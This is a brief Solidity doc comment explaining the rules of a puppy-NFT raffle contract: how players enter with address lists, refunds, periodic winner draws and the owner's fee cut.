/// 1. Call the `enterRaffle` function with the following parameters:
///    1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
/// 2. Duplicate addresses are not allowed
/// 3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
/// 4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
/// 5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.
